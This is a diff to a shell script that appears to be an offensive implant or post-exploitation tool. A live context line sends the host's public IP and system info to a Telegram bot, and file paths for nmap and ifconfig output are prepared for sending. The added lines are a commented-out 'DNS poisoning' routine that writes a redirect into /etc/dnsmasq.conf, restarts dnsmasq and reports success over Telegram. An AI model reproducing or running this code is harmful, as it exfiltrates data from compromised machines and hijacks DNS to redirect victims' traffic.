@@ -45,6 +45,15 @@ if [ $? -eq 0 ]; then
 	#iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
 	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info %0APort forwading enabled: $public_ip":"$f_port"		
 
+	#DNS poisoning
+	#domain="example.com"
+	#ip_server="192.168.1.100"
+	#edit dnsmasq.conf
+	#echo "address=/$domain/$ip_server" >> /etc/dnsmasq.conf
+	# restart dnsmasq
+	#systemctl restart dnsmasq
+	#curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Redirection completed successfully: $domain -> $ip_server"
+
 	filepath1=$nmap_output_file
 	filepath3=$ifconfig_output_file
 	curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info"
